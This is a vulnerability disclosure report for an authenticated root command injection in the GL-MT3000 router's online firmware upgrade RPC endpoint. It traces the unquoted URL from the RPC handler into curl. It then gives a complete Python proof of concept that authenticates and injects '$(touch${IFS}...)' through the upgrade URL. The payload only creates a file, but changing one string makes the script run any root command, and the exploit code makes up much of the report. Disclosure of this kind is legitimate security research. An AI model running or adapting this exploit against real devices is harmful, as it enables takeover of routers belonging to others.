# 漏洞2
Submittion Date: 2026.4.29  
Vendor: GL-MT3000   
Version: 4.4.5  
Firmware: openwrt-mt3000-4.4.5-0811-1691754744.tar  
Download Link: https://dl.gl-inet.cn/router/mt3000/stable   


An authenticated command injection vulnerability exists in the online firmware upgrade workflow of the affected product. The `POST /rpc` endpoint can invoke `upgrade.upgrade_online` with a user-controlled firmware URL. The RPC handler passes this value to `/usr/bin/one_click_upgrade`, where the firmware path is later used in a shell command without sufficient sanitization and quoting. If the firmware URL is accepted with shell metacharacters, an authenticated attacker may be able to execute arbitrary commands with `root` privileges. The firmware checksum verification fails afterward, so the device does not continue with a real firmware flashing process.

The online upgrade flow accepts a firmware URL from an authenticated RPC request. The URL is passed through the RPC layer into the upgrade handler and then to the `/usr/bin/one_click_upgrade` script.

The reported vulnerable flow is:

```text
Authenticated user
  -> POST /rpc
  -> calls upgrade.upgrade_online(url=<attacker-controlled value>)
  -> RPC layer passes the URL to /usr/bin/one_click_upgrade
  -> one_click_upgrade assigns the first argument to firmware_path
  -> curl is executed with the firmware_path value
  -> insufficient quoting/sanitization may allow shell interpretation
  -> command execution occurs with root privileges
  -> sha256 verification fails afterward and the firmware upgrade stops
```

The source notes indicate that the `firmware_url` validation does not adequately prevent shell-sensitive input. The observed validation pattern is:
```python
"^https?://[%w-_%.%?%.:/%+=&]+$"
```
![image.png](image.png)

The URL value is then passed into the upgrade workflow.

![image.png](image%201.png)

Although the RPC handler appears to place the URL argument inside single quotes when constructing the command, the value is later assigned inside `/usr/bin/one_click_upgrade` and used again in a shell command.
![image.png](image%203.png)
The reported issue is that `firmware_path` is expanded without adequate quoting when passed to `curl`:

![image.png](image%202.png)

Exploit the vulnerability by sending a carefully constructed HTTP request
```python
#!/usr/bin/env python3
from __future__ import annotations

import argparse
import hashlib
import json
import ssl
import subprocess
import urllib.error
import urllib.request


class GLInetError(RuntimeError):
    pass


class GLInetClient:
    def __init__(self, base_url: str, username: str, password: str, timeout: int = 15, verify_ssl: bool = False):
        self.base_url = base_url.rstrip("/")
        self.username = username
        self.password = password
        self.timeout = timeout
        self.sid: str | None = None
        self._ssl_context = ssl.create_default_context() if verify_ssl else ssl._create_unverified_context()

    def _open(self, req: urllib.request.Request) -> bytes:
        try:
            with urllib.request.urlopen(req, timeout=self.timeout, context=self._ssl_context) as resp:
                return resp.read()
        except urllib.error.HTTPError as exc:
            raise GLInetError(f"HTTP {exc.code}: {exc.read().decode(errors='replace')}") from exc
        except urllib.error.URLError as exc:
            raise GLInetError(f"Connection failed: {exc}") from exc

    def _post_json(self, path: str, obj: dict) -> dict:
        req = urllib.request.Request(
            f"{self.base_url}{path}",
            data=json.dumps(obj).encode(),
            headers={"Content-Type": "application/json"},
            method="POST",
        )
        return json.loads(self._open(req).decode())

    def login(self) -> str:
        challenge = self._post_json(
            "/rpc",
            {"jsonrpc": "2.0", "id": 1, "method": "challenge", "params": {"username": self.username}},
        )
        if "error" in challenge:
            raise GLInetError(f"challenge failed: {challenge['error']}")

        salt = challenge["result"]["salt"]
        nonce = challenge["result"]["nonce"]
        crypt_pw = subprocess.check_output(["openssl", "passwd", "-1", "-salt", salt, self.password], text=True).strip()
        digest = hashlib.md5(f"{self.username}:{crypt_pw}:{nonce}".encode()).hexdigest()

        login = self._post_json(
            "/rpc",
            {
                "jsonrpc": "2.0",
                "id": 2,
                "method": "login",
                "params": {"username": self.username, "hash": digest},
            },
        )
        if "error" in login:
            raise GLInetError(f"login failed: {login['error']}")

        self.sid = login["result"]["sid"]
        return self.sid

    def rpc_call(self, obj: str, method: str, args: dict) -> dict:
        if not self.sid:
            self.login()
        resp = self._post_json(
            "/rpc",
            {"jsonrpc": "2.0", "id": 3, "method": "call", "params": [self.sid, obj, method, args]},
        )
        if "error" in resp:
            raise GLInetError(f"rpc call failed: {resp['error']}")
        return resp.get("result", {})


def main() -> int:
    parser = argparse.ArgumentParser(description="Minimal upgrade.upgrade_online PoC: create a file on the target.")
    parser.add_argument("--base-url", default="http://192.168.8.1")
    parser.add_argument("--username", default="root")
    parser.add_argument("--password", default="12345678Q!")
    parser.add_argument("--target-file", default="/tmp/pwnpoc2")
    parser.add_argument("--sha256", default="0" * 64)
    args = parser.parse_args()

    payload = f"http://127.0.0.1/$(touch${{IFS}}{args.target_file})"

    client = GLInetClient(args.base_url, args.username, args.password)
    sid = client.login()
    result = client.rpc_call(
        "upgrade",
        "upgrade_online",
        {
            "url": payload,
            "sha256": args.sha256,
            "keep_config": False,
            "keep_package": False,
        },
    )

    print(f"[+] sid: {sid}")
    print(f"[+] payload: {payload}")
    print(f"[+] rpc result: {result}")
    print(f"[+] if successful, the target should create: {args.target_file}")
    print("[+] note: sha256 is intentionally wrong so the flow stops before any real upgrade")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())

```
The exploitation is shown below.
![image.png](image%204.png)